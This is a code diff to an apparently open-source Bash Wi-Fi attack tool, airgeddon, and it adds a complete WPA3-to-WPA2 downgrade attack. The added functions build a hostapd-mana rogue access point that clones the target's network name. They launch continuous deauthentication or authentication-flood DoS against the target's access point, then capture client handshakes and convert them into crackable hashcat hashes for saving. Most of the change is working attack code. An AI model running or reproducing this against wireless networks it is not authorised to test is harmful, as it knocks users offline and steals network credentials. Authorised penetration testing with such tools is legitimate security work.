@@ -74,6 +74,8 @@ optional_tools_names=(
 						"tshark"
 						"tcpdump"
 						"besside-ng"
+						"hostapd-mana"
+						"hcxhash2cap"
 					)
 
 update_tools=("curl")
@@ -116,6 +118,8 @@ declare -A possible_package_names=(
 									[${optional_tools_names[25]}]="tshark / wireshark-cli / wireshark" #tshark
 									[${optional_tools_names[26]}]="tcpdump" #tcpdump
 									[${optional_tools_names[27]}]="aircrack-ng" #besside-ng
+									[${optional_tools_names[28]}]="hostapd-mana" #hostapd-mana
+									[${optional_tools_names[29]}]="hcxtools" #hcxhash2cap
 									[${update_tools[0]}]="curl" #curl
 								)
 
@@ -134,6 +138,7 @@ timeout_capture_handshake_decloak="20"
 timeout_capture_pmkid="45"
 timeout_capture_identities="45"
 timeout_certificates_analysis="45"
+timeout_wpa3_downgrade="20"
 osversionfile_dir="/etc/"
 plugins_dir="plugins/"
 ag_orchestrator_file="ag.orchestrator.txt"
@@ -241,7 +246,7 @@ author="v1s1t0r"
 wpa3_online_attack_plugin_repo="https://${repository_hostname}/OscarAkaElvis/airgeddon-plugins"
 wpa3_dragon_drain_plugin_repo="https://${repository_hostname}/Janek79ax/dragon-drain-wpa3-airgeddon-plugin"
 
-#Dhcpd, Hostapd and misc Evil Twin vars
+#Dhcpd, Hostapd, Hostapd-wpe, Hostapd-mana and misc Evil Twin vars
 loopback_ip="127.0.0.1"
 loopback_ipv6="::1/128"
 loopback_interface="lo"
@@ -281,6 +286,9 @@ hostapd_wpe_wifi7_version="2.12"
 hostapd_wpe_file="ag.hostapd_wpe.conf"
 hostapd_wpe_log="ag.hostapd_wpe.log"
 hostapd_wpe_default_log="hostapd-wpe.log"
+hostapd_mana_file="ag.hostapd_mana.conf"
+hostapd_mana_log="ag.hostapd_mana.log"
+hostapd_mana_out="ag.hostapd_mana.hccapx"
 control_et_file="ag.et_control.sh"
 control_enterprise_file="ag.enterprise_control.sh"
 enterprisedir="enterprise/"
@@ -288,6 +296,9 @@ certsdir="certs/"
 certspass="airgeddon"
 default_certs_path="/etc/hostapd-wpe/certs/"
 default_certs_pass="whatever"
+mana_pass="airgeddon"
+mana_cap_file="ag.mana.cap"
+mana_tmp_file="ag.mana.txt"
 webserver_file="ag.lighttpd.conf"
 webserver_log="ag.lighttpd.log"
 webdir="www/"
@@ -383,6 +394,7 @@ declare language_hints=(250 438)
 declare option_hints=(445 250 448 477 591 626 697 699)
 declare evil_twin_hints=(254 258 264 269 309 328 400 509 697 699 739)
 declare evil_twin_dos_hints=(267 268 509 697 699)
+declare wpa3_dos_hints=(267 268 697 699 777)
 declare beef_hints=(408)
 declare wps_hints=(342 343 344 356 369 390 490 625 697 699 739)
 declare wep_hints=(431 429 428 432 433 697 699 739)
@@ -1558,7 +1570,22 @@ function region_check() {
 	[[ ! ${country_code} =~ ^[A-Z]{2}$|^99$ ]] && country_code="00"
 }
 
-#Prepare monitor mode avoiding the use of airmon-ng or airmon-zc generating two interfaces from one
+#Prepare monitor mode avoiding the use of airmon-ng or airmon-zc generating two interfaces from one for WPA3 downgrade attack
+function prepare_wpa3_downgrade_monitor() {
+
+	debug_print
+
+	disable_rfkill
+
+	iface_phy_number=${phy_interface:3:1}
+	iface_monitor_downgrade_deauth="mon${iface_phy_number}"
+
+	iw dev "${interface}" set channel "${channel}" > /dev/null 2>&1
+	iw phy "${phy_interface}" interface add "${iface_monitor_downgrade_deauth}" type monitor 2> /dev/null
+	ip link set "${iface_monitor_downgrade_deauth}" up > /dev/null 2>&1
+}
+
+#Prepare monitor mode avoiding the use of airmon-ng or airmon-zc generating two interfaces from one for Evil Twin attacks
 function prepare_et_monitor() {
 
 	debug_print
@@ -1660,6 +1687,90 @@ function restore_et_interface() {
 	fi
 
 	control_routing_status "end"
+}
+
+#Assure the mode of the interface before the WPA3 downgrade attack process
+function prepare_wpa3_downgrade_interface() {
+
+	debug_print
+
+	downgrade_initial_state=${ifacemode}
+
+	if [ "${ifacemode}" != "Managed" ]; then
+		check_airmon_compatibility "interface"
+		if [ "${interface_airmon_compatible}" -eq 1 ]; then
+
+			new_interface=$(${airmon} stop "${interface}" 2> /dev/null | grep station | head -n 1)
+			ifacemode="Managed"
+			[[ ${new_interface} =~ \]?([A-Za-z0-9]+)\)?$ ]] && new_interface="${BASH_REMATCH[1]}"
+
+			if [ "${interface}" != "${new_interface}" ]; then
+				if check_interface_coherence; then
+					interface=${new_interface}
+					phy_interface=$(physical_interface_finder "${interface}")
+					check_interface_supported_bands "${phy_interface}" "main_wifi_interface"
+					current_iface_on_messages="${interface}"
+				fi
+				echo
+				language_strings "${language}" 15 "yellow"
+			fi
+		else
+			if ! set_mode_without_airmon "${interface}" "managed"; then
+				echo
+				language_strings "${language}" 1 "red"
+				language_strings "${language}" 115 "read"
+				return 1
+			else
+				ifacemode="Managed"
+			fi
+		fi
+	fi
+}
+
+#Restore the state of the interfaces after WAP3 downgrade attack process
+function restore_wpa3_downgrade_interface() {
+
+	debug_print
+
+	echo
+	language_strings "${language}" 299 "blue"
+
+	disable_rfkill
+
+	mac_spoofing_desired=0
+
+	iw dev "${iface_monitor_downgrade_deauth}" del > /dev/null 2>&1
+
+	if [ "${downgrade_initial_state}" = "Managed" ]; then
+		set_mode_without_airmon "${interface}" "managed"
+		ifacemode="Managed"
+	else
+		if [ "${interface_airmon_compatible}" -eq 1 ]; then
+			new_interface=$(${airmon} start "${interface}" 2> /dev/null | grep monitor)
+			desired_interface_name=""
+			[[ ${new_interface} =~ ^You[[:space:]]already[[:space:]]have[[:space:]]a[[:space:]]([A-Za-z0-9]+)[[:space:]]device ]] && desired_interface_name="${BASH_REMATCH[1]}"
+			if [ -n "${desired_interface_name}" ]; then
+				echo
+				language_strings "${language}" 435 "red"
+				language_strings "${language}" 115 "read"
+				return
+			fi
+
+			ifacemode="Monitor"
+
+			[[ ${new_interface} =~ \]?([A-Za-z0-9]+)\)?$ ]] && new_interface="${BASH_REMATCH[1]}"
+			if [ "${interface}" != "${new_interface}" ]; then
+				interface=${new_interface}
+				phy_interface=$(physical_interface_finder "${interface}")
+				check_interface_supported_bands "${phy_interface}" "main_wifi_interface"
+				current_iface_on_messages="${interface}"
+			fi
+		else
+			if set_mode_without_airmon "${interface}" "monitor"; then
+				ifacemode="Monitor"
+			fi
+		fi
+	fi
 }
 
 #Unblock if possible the interface if blocked
@@ -1920,6 +2031,7 @@ function hookable_wpa3_attacks_menu() {
 	language_strings "${language}" 56
 	language_strings "${language}" 49
 	language_strings "${language}" 50 "separator"
+	language_strings "${language}" 774 wpa3_downgrade_attack_dependencies[@]
 	language_strings "${language}" 756 "${plugin_x_under_construction}"
 	language_strings "${language}" 757 "${plugin_y_under_construction}"
 	print_hint
@@ -1942,9 +2054,40 @@ function hookable_wpa3_attacks_menu() {
 			explore_for_targets_option "WPA3"
 		;;
 		5)
-			"${plugin_x}"
+			if contains_element "${wpa3_option}" "${forbidden_options[@]}"; then
+				forbidden_menu_option
+			else
+				current_iface_on_messages="${interface}"
+				if check_interface_wifi "${interface}"; then
+					if [ "${adapter_vif_support}" -eq 0 ]; then
+						ask_yesno 696 "no"
+						if [ "${yesno}" = "y" ]; then
+							downgrade_attack_adapter_prerequisites_ok=1
+						fi
+					else
+						downgrade_attack_adapter_prerequisites_ok=1
+					fi
+
+					if [ "${downgrade_attack_adapter_prerequisites_ok}" -eq 1 ]; then
+						if explore_for_targets_option "WPA3"; then
+							if validate_wpa3_network "only_mixed" "${tmpdir}nws-01.cap"; then
+								if validate_network_type "personal"; then
+									wpa3_dos_menu
+								fi
+							fi
+						fi
+					fi
+				else
+					echo
+					language_strings "${language}" 281 "red"
+					language_strings "${language}" 115 "read"
+				fi
+			fi
 		;;
 		6)
+			"${plugin_x}"
+		;;
+		7)
 			"${plugin_y}"
 		;;
 		*)
@@ -3289,6 +3432,10 @@ function read_timeout() {
 			min_max_timeout="10-100"
 			timeout_shown="${timeout_certificates_analysis}"
 		;;
+		"wpa3_downgrade")
+			min_max_timeout="10-100"
+			timeout_shown="${timeout_wpa3_downgrade}"
+		;;
 	esac
 
 	language_strings "${language}" 393 "green"
@@ -3319,6 +3466,9 @@ function ask_timeout() {
 		"certificates_analysis")
 			local regexp="^[1-9][0-9]$|^100$|^$"
 		;;
+		"wpa3_downgrade")
+			local regexp="^[1-9][0-9]$|^100$|^$"
+		;;
 	esac
 
 	timeout=0
@@ -3346,6 +3496,9 @@ function ask_timeout() {
 			"certificates_analysis")
 				timeout="${timeout_certificates_analysis}"
 			;;
+			"wpa3_downgrade")
+				timeout="${timeout_wpa3_downgrade}"
+			;;
 		esac
 	fi
 
@@ -3368,6 +3521,9 @@ function ask_timeout() {
 		;;
 		"certificates_analysis")
 			timeout_certificates_analysis="${timeout}"
+		;;
+		"wpa3_downgrade")
+			timeout_wpa3_downgrade="${timeout}"
 		;;
 	esac
 
@@ -3867,16 +4023,38 @@ function validate_network_type() {
 	return 0
 }
 
-#Validate a WPA3 network
+#Validate a WPA3 network (any type or only in mixed mode)
 function validate_wpa3_network() {
 
 	debug_print
 
+	local type
+
+	if [ -z "${1}" ]; then
+		type="wpa3_pure_and_wpa3_mixed"
+	else
+		type="${1}"
+	fi
+
 	if [ "${enc}" != "WPA3" ]; then
 		echo
-		language_strings "${language}" 759 "red"
+		if [ "${type}" = "wpa3_pure_and_wpa3_mixed"  ]; then
+			language_strings "${language}" 759 "red"
+		elif [ "${type}" = "only_mixed"  ]; then
+			language_strings "${language}" 780 "red"
+		fi
+
 		language_strings "${language}" 115 "read"
 		return 1
+	else
+		if [ "${type}" = "only_mixed"  ]; then
+			if ! tshark -r "${2}" -Y "wlan.rsn.akms.type == 2 && wlan.rsn.akms.type == 8 && wlan.sa == ${bssid}" -T fields -e wlan.sa 2> /dev/null | grep -q .; then
+				echo
+				language_strings "${language}" 781 "red"
+				language_strings "${language}" 115 "read"
+				return 1
+			fi
+		fi
 	fi
 
 	return 0
@@ -6083,6 +6261,7 @@ function initialize_menu_options_dependencies() {
 	johncrunch_attacks_dependencies=("${optional_tools_names[21]}" "${optional_tools_names[1]}")
 	enterprise_certificates_dependencies=("${optional_tools_names[22]}")
 	pmkid_dependencies=("${optional_tools_names[23]}" "${optional_tools_names[24]}")
+	wpa3_downgrade_attack_dependencies=("${optional_tools_names[23]}" "${optional_tools_names[28]}" "${optional_tools_names[29]}" "${optional_tools_names[25]}")
 }
 
 #Set possible changes for some commands that can be found in different ways depending on the O.S.
@@ -6226,6 +6405,10 @@ function initialize_menu_and_print_selections() {
 				print_iface_internet_selected
 			fi
 		;;
+		"wpa3_dos_menu")
+			print_iface_selected
+			print_all_target_vars
+		;;
 		"wps_attacks_menu")
 			print_iface_selected
 			print_all_target_vars_wps
@@ -6247,6 +6430,8 @@ function initialize_menu_and_print_selections() {
 			print_options
 		;;
 		"wpa3_attacks_menu")
+			downgrade_attack_adapter_prerequisites_ok=0
+			return_to_wpa3_main_menu=0
 			print_iface_selected
 			print_all_target_vars
 			if [[ " ${plugins_enabled[*]} " == *" wpa3_online_attack "* ]]; then
@@ -6366,6 +6551,11 @@ function clean_tmpfiles() {
 		rm -rf "${tmpdir}jtrtmp"* > /dev/null 2>&1
 		rm -rf "${tmpdir}${aircrack_pot_tmp}" > /dev/null 2>&1
 		rm -rf "${tmpdir}${et_processesfile}" > /dev/null 2>&1
+		rm -rf "${tmpdir}${hostapd_mana_file}" > /dev/null 2>&1
+		rm -rf "${tmpdir}${hostapd_mana_out}" > /dev/null 2>&1
+		rm -rf "${tmpdir}${hostapd_mana_log}" > /dev/null 2>&1
+		rm -rf "${tmpdir}${mana_cap_file}" > /dev/null 2>&1
+		rm -rf "${tmpdir}${mana_tmp_file}" > /dev/null 2>&1
 		rm -rf "${tmpdir}${hostapd_file}" > /dev/null 2>&1
 		rm -rf "${tmpdir}${hostapd_wpe_file}" > /dev/null 2>&1
 		rm -rf "${tmpdir}${hostapd_wpe_log}" > /dev/null 2>&1
@@ -6651,6 +6841,13 @@ function print_hint() {
 			((hintlength--))
 			randomhint=$(shuf -i 0-"${hintlength}" -n 1)
 			strtoprint=${hints[evil_twin_hints|${randomhint}]}
+		;;
+		"wpa3_dos_menu")
+			store_array hints wpa3_dos_hints "${wpa3_dos_hints[@]}"
+			hintlength=${#wpa3_dos_hints[@]}
+			((hintlength--))
+			randomhint=$(shuf -i 0-"${hintlength}" -n 1)
+			strtoprint=${hints[wpa3_dos_hints|${randomhint}]}
 		;;
 		"et_dos_menu")
 			store_array hints evil_twin_dos_hints "${evil_twin_dos_hints[@]}"
@@ -8297,6 +8494,35 @@ function manage_asking_for_rule_file() {
 	fi
 }
 
+#Check if a hash is present in hostapd-mana log
+function check_mana_hashes() {
+
+	debug_print
+
+	mana_hash=""
+	rm -rf "${tmpdir}${mana_cap_file}" > /dev/null 2>&1
+	rm -rf "${tmpdir}${mana_tmp_file}" > /dev/null 2>&1
+
+	while true; do
+		if grep -Eqim1 '^MANA: Captured a WPA/2 handshake from:' "${tmpdir}${hostapd_mana_log}"; then
+			if grep -Eqim1 '^MANA WPA2 HASHCAT' "${tmpdir}${hostapd_mana_log}"; then
+				mana_hash=$(grep -Eim1 '^MANA WPA2 HASHCAT' "${tmpdir}${hostapd_mana_log}" | awk -F "\|" '{print $2}' 2> /dev/null | tr -d " ")
+			else
+				hcxhash2cap --hccapx="${tmpdir}${hostapd_mana_out}" -c "${tmpdir}${mana_cap_file}" > /dev/null
+				hcxpcapngtool "${tmpdir}${mana_cap_file}" -o "${tmpdir}${mana_tmp_file}" > /dev/null
+				mana_hash=$(head -n1 "${tmpdir}${mana_tmp_file}")
+			fi
+			break
+		fi
+
+		if ! ps -p "${hostapd_mana_pid}" > /dev/null 2>&1; then
+			break
+		fi
+
+		sleep 3
+	done
+}
+
 #Validate the file to be cleaned
 function check_valid_file_to_clean() {
 
@@ -9200,6 +9426,41 @@ function manage_aircrack_pot() {
 	fi
 }
 
+#Check if hashes were captured during WPA3 downgrade attack
+function manage_mana_pot() {
+
+	debug_print
+
+	if [ -n "${mana_hash}" ]; then
+		echo
+		language_strings "${language}" 530 "yellow"
+
+		ask_yesno 785 "yes"
+		if [ "${yesno}" = "y" ]; then
+			downgrade_potpath="${default_save_path}"
+			downgradepot_filename="wpa3-downgrade-hash-${bssid}.txt"
+			downgrade_potpath="${downgrade_potpath}${downgradepot_filename}"
+
+			validpath=1
+			while [[ "${validpath}" != "0" ]]; do
+				read_path "downgradepot"
+			done
+
+			{
+			echo "${mana_hash}"
+			} >> "${downgradepotenteredpath}"
+
+			echo
+			language_strings "${language}" 786 "blue"
+			language_strings "${language}" 115 "read"
+		fi
+	else
+		echo
+		language_strings "${language}" 788 "red"
+		language_strings "${language}" 115 "read"
+	fi
+}
+
 #Check if the password was decrypted using asleap against challenges and responses
 function manage_asleap_pot() {
 
@@ -10026,6 +10287,21 @@ function exec_hashcat_rulebased_attack() {
 	language_strings "${language}" 115 "read"
 }
 
+#Execute WPA3 downgrade attack
+function exec_wpa3_downgrade_attack() {
+
+	debug_print
+
+	set_hostapd_mana_config
+	launch_fake_mana_ap
+	exec_wpa3_downgrade_deauth
+	check_mana_hashes
+	kill_wpa3_downgrade_attack_processes
+	restore_wpa3_downgrade_interface
+	manage_mana_pot
+	clean_tmpfiles
+}
+
 #Execute Enterprise smooth/noisy attack
 function exec_enterprise_attack() {
 
@@ -10412,6 +10688,60 @@ function set_bettercap_config() {
 	} >> "${tmpdir}${bettercap_config_file}"
 }
 
+#Create configuration file for hostapd-mana
+function set_hostapd_mana_config() {
+
+	debug_print
+
+	rm -rf "${tmpdir}${hostapd_mana_file}" > /dev/null 2>&1
+	rm -rf "${tmpdir}${hostapd_mana_out}" > /dev/null 2>&1
+
+	et_bssid=$(generate_fake_bssid "${bssid}")
+
+	{
+	echo -e "interface=${interface}"
+	echo -e "driver=nl80211"
+	echo -e "ssid=${essid}"
+	echo -e "bssid=${et_bssid}"
+	echo -e "mana_wpaout=${tmpdir}${hostapd_mana_out}"
+	echo -e "wpa=2"
+	echo -e "wpa_key_mgmt=WPA-PSK"
+	echo -e "wpa_pairwise=TKIP CCMP"
+	echo -e "wpa_passphrase=\"${mana_pass}\""
+	echo -e "channel=${channel}"
+	} >> "${tmpdir}${hostapd_mana_file}"
+
+	if [ "${channel}" -gt 14 ]; then
+		{
+		echo -e "hw_mode=a"
+		} >> "${tmpdir}${hostapd_mana_file}"
+	else
+		{
+		echo -e "hw_mode=g"
+		} >> "${tmpdir}${hostapd_mana_file}"
+	fi
+
+	if [ "${country_code}" != "00" ]; then
+		{
+		echo -e "country_code=${country_code}"
+		} >> "${tmpdir}${hostapd_mana_file}"
+	fi
+
+	if [ "${standard_80211n}" -eq 1 ]; then
+		{
+		echo -e "ieee80211n=1"
+		} >> "${tmpdir}${hostapd_mana_file}"
+	fi
+
+	if [ "${standard_80211ac}" -eq 1 ]; then
+		{
+		echo -e "ieee80211ac=1"
+		} >> "${tmpdir}${hostapd_mana_file}"
+	fi
+
+	#ieee80211ax and ieee80211be not supported
+}
+
 #Create configuration file for hostapd
 function set_hostapd_config() {
 
@@ -10588,6 +10918,39 @@ function generate_fake_essid() {
 	else
 		echo -e "${1}"
 	fi
+}
+
+#Launch hostapd-mana fake Access Point
+function launch_fake_mana_ap() {
+
+	debug_print
+
+	if "${AIRGEDDON_FORCE_NETWORK_MANAGER_KILLING:-true}"; then
+		${airmon} check kill > /dev/null 2>&1
+		nm_processes_killed=1
+	else
+		if [ "${check_kill_needed}" -eq 1 ]; then
+			${airmon} check kill > /dev/null 2>&1
+			nm_processes_killed=1
+		fi
+	fi
+
+	if [ "${mac_spoofing_desired}" -eq 1 ]; then
+		set_spoofed_mac "${interface}"
+	fi
+
+	rm -rf "${tmpdir}${hostapd_mana_log}" > /dev/null 2>&1
+	recalculate_windows_sizes
+	manage_output "+j -bg \"#000000\" -fg \"#00FF00\" -geometry ${g1_topright_window} -T \"AP\"" "timeout -s SIGTERM ${timeout_wpa3_downgrade} hostapd-mana \"${tmpdir}${hostapd_mana_file}\" | tee ${tmpdir}${hostapd_mana_log}" "AP" "active"
+	if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "xterm" ]; then
+		hostapd_mana_pid=$!
+	else
+		get_tmux_process_id "timeout -s SIGTERM ${timeout_wpa3_downgrade} hostapd-mana \"${tmpdir}${hostapd_mana_file}\""
+		hostapd_mana_pid="${global_process_pid}"
+		global_process_pid=""
+	fi
+
+	sleep 3
 }
 
 #Launch hostapd and hostapd-wpe fake Access Point
@@ -10958,6 +11321,40 @@ function exec_et_deauth() {
 
 		sleep 1
 	fi
+}
+
+#Execute DoS for WPA3 downgrade attack
+function exec_wpa3_downgrade_deauth() {
+
+	debug_print
+
+	prepare_wpa3_downgrade_monitor
+
+	case ${downgrade_dos_attack} in
+		"${mdk_command}")
+			rm -rf "${tmpdir}bl.txt" > /dev/null 2>&1
+			echo "${bssid}" > "${tmpdir}bl.txt"
+			deauth_downgrade_cmd="${mdk_command} ${iface_monitor_downgrade_deauth} d -b ${tmpdir}\"bl.txt\" -c ${channel}"
+		;;
+		"Aireplay")
+			deauth_downgrade_cmd="aireplay-ng --deauth 0 -a ${bssid} --ignore-negative-one ${iface_monitor_downgrade_deauth}"
+		;;
+		"Auth DoS")
+			deauth_downgrade_cmd="${mdk_command} ${iface_monitor_downgrade_deauth} a -a ${bssid} -m"
+		;;
+	esac
+
+	recalculate_windows_sizes
+	manage_output "+j -bg \"#000000\" -fg \"#FF0000\" -geometry ${g1_bottomleft_window} -T \"Deauth\"" "${deauth_downgrade_cmd}" "Deauth"
+	if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "xterm" ]; then
+		downgrade_dos_pid=$!
+	else
+		get_tmux_process_id "${deauth_downgrade_cmd}"
+		downgrade_dos_pid="${global_process_pid}"
+		global_process_pid=""
+	fi
+
+	sleep 1
 }
 
 #Create here-doc bash script used for wps pin attacks
@@ -12881,6 +13278,19 @@ function write_et_processes() {
 	wait "${parent_pid}" 2> /dev/null
 	}
 
+#Kill the WPA3 downgrade attack processes
+function kill_wpa3_downgrade_attack_processes() {
+
+	debug_print
+
+	kill "${hostapd_mana_pid}" &> /dev/null
+	kill "${downgrade_dos_pid}" &> /dev/null
+
+	if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
+		kill_tmux_windows
+	fi
+}
+
 #Kill the Evil Twin and Enterprise processes
 function kill_et_windows() {
 
@@ -13486,6 +13896,10 @@ function validate_path() {
 		fi
 
 		case ${2} in
+			"downgradepot")
+				suggested_filename="${downgradepot_filename}"
+				downgradepotenteredpath+="${downgradepot_filename}"
+			;;
 			"wpa3pot")
 				suggested_filename="${wpa3pot_filename}"
 				wpa3potenteredpath+="${wpa3pot_filename}"
@@ -13661,6 +14075,15 @@ function read_path() {
 
 	echo
 	case ${1} in
+		"downgradepot")
+			language_strings "${language}" 787 "green"
+			read_and_clean_path "downgradepotenteredpath"
+			if [ -z "${downgradepotenteredpath}" ]; then
+				downgradepotenteredpath="${downgrade_potpath}"
+			fi
+			downgradepotenteredpath=$(set_absolute_path "${downgradepotenteredpath}")
+			validate_path "${downgradepotenteredpath}" "${1}"
+		;;
 		"wpa3pot")
 			language_strings "${language}" 762 "blue"
 			read_and_clean_path "wpa3potenteredpath"
@@ -14558,7 +14981,6 @@ function explore_for_targets_option() {
 					;;
 					"WPA3")
 						#Only WPA3 including WPA2/WPA3 in Mixed mode
-						#Not used yet in airgeddon
 						echo -e "${exp_mac},${exp_channel},${exp_power},${exp_essid},${exp_enc},${exp_auth}" >> "${tmpdir}nws.txt"
 					;;
 					"WPA")
@@ -14998,6 +15420,67 @@ function wps_pin_database_prerequisites() {
 	fi
 }
 
+#Manage and validate the prerequisites for WPA3 downgrade attack
+function wpa3_downgrade_prerequisites() {
+
+	debug_print
+
+	clear
+	current_menu="wpa3_attacks_menu"
+	language_strings "${language}" 778 "title"
+	print_iface_selected
+	print_all_target_vars
+	print_hint
+
+	if [[ -z "${mac_spoofing_desired}" ]] || [[ "${mac_spoofing_desired}" -eq 0 ]]; then
+		ask_yesno 419 "no"
+		if [ "${yesno}" = "y" ]; then
+			mac_spoofing_desired=1
+		fi
+	fi
+
+	return_to_wpa3_main_menu=1
+
+	if [ "${essid}" = "(Hidden Network)" ]; then
+		echo
+		language_strings "${language}" 784 "red"
+		language_strings "${language}" 115 "read"
+		return
+	fi
+
+	if [ "${is_docker}" -eq 1 ]; then
+		echo
+		language_strings "${language}" 779 "pink"
+		language_strings "${language}" 115 "read"
+	fi
+
+	region_check
+
+	if [ "${channel}" -gt 14 ]; then
+		echo
+		if [ "${country_code}" = "00" ]; then
+			language_strings "${language}" 706 "yellow"
+		elif [ "${country_code}" = "99" ]; then
+			language_strings "${language}" 719 "yellow"
+		else
+			language_strings "${language}" 392 "blue"
+		fi
+	fi
+
+	ask_timeout "wpa3_downgrade"
+
+	echo
+	language_strings "${language}" 782 "blue"
+	echo
+	language_strings "${language}" 783 "yellow"
+	language_strings "${language}" 115 "read"
+	echo
+	language_strings "${language}" 325 "blue"
+
+	prepare_wpa3_downgrade_interface
+	exec_wpa3_downgrade_attack
+}
+
 #Manage and validate the prerequisites for Evil Twin and Enterprise attacks
 function et_prerequisites() {
 
@@ -15433,6 +15916,66 @@ function et_dos_menu() {
 	else
 		et_dos_menu
 	fi
+}
+
+#DoS WPA3 downgrade attack menu
+function wpa3_dos_menu() {
+
+	debug_print
+
+	if [[ -n "${return_to_wpa3_main_menu}" ]] && [[ "${return_to_wpa3_main_menu}" -eq 1 ]]; then
+		return
+	fi
+
+	clear
+	language_strings "${language}" 775 "title"
+	current_menu="wpa3_dos_menu"
+	initialize_menu_and_print_selections
+	echo
+	language_strings "${language}" 47 "green"
+	print_simple_separator
+	language_strings "${language}" 776
+	print_simple_separator
+	language_strings "${language}" 139 mdk_attack_dependencies[@]
+	language_strings "${language}" 140 aireplay_attack_dependencies[@]
+	language_strings "${language}" 141 mdk_attack_dependencies[@]
+	print_hint
+
+	read -rp "> " wpa3_dos_option
+	case ${wpa3_dos_option} in
+		0)
+			return
+		;;
+		1)
+			if contains_element "${wpa3_dos_option}" "${forbidden_options[@]}"; then
+				forbidden_menu_option
+			else
+				downgrade_dos_attack="${mdk_command}"
+				wpa3_downgrade_prerequisites
+			fi
+		;;
+		2)
+			if contains_element "${wpa3_dos_option}" "${forbidden_options[@]}"; then
+				forbidden_menu_option
+			else
+				downgrade_dos_attack="Aireplay"
+				wpa3_downgrade_prerequisites
+			fi
+		;;
+		3)
+			if contains_element "${wpa3_dos_option}" "${forbidden_options[@]}"; then
+				forbidden_menu_option
+			else
+				downgrade_dos_attack="Auth DoS"
+				wpa3_downgrade_prerequisites
+			fi
+		;;
+		*)
+			invalid_menu_option
+		;;
+	esac
+
+	wpa3_dos_menu
 }
 
 #Selected internet interface detection
@@ -18361,6 +18904,7 @@ function remove_warnings() {
 	echo "${johncrunch_attacks_dependencies[@]}" > /dev/null 2>&1
 	echo "${enterprise_certificates_dependencies[@]}" > /dev/null 2>&1
 	echo "${pmkid_dependencies[@]}" > /dev/null 2>&1
+	echo "${wpa3_downgrade_attack_dependencies[@]}" > /dev/null 2>&1
 	echo "${is_arm}" > /dev/null 2>&1
 }
 
